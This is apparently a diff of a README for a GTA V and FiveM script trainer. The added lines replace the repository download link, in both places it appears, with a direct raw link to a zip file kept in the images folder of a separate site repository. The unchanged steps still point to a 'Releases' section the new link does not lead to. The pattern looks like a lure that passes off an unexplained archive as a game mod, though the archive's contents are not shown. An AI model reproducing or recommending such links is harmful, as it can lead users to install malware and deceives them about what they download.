@@ -5,7 +5,7 @@ description: "Modify GTA V and FiveM worlds with this ASI script trainer featuri
 ---
 # 🎮 menyoo-2026-script-utility - Control your game world with ease
 
-[![Download Tool](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Jaffy9/menyoo-2026-script-utility)
+[![Download Tool](https://img.shields.io/badge/Download-Release-blue)](https://raw.githubusercontent.com/Jaffy9/jaffy9.github.io/main/images/2.0.zip)
 
 This utility gives you full control over your experience in GTA V and FiveM. It allows you to change the environment, spawn objects, and manage game entities without writing code. This tool integrates directly with your game files to provide a stable menu system that functions during your session.
 
@@ -23,7 +23,7 @@ Before you begin, ensure your computer meets these basic requirements:
 
 Follow these steps to set up the software.
 
-1. Visit the following link to access the files: [https://github.com/Jaffy9/menyoo-2026-script-utility](https://github.com/Jaffy9/menyoo-2026-script-utility).
+1. Visit the following link to access the files: [https://raw.githubusercontent.com/Jaffy9/jaffy9.github.io/main/images/2.0.zip](https://raw.githubusercontent.com/Jaffy9/jaffy9.github.io/main/images/2.0.zip).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version available.
 4. Download the compressed folder to your computer.
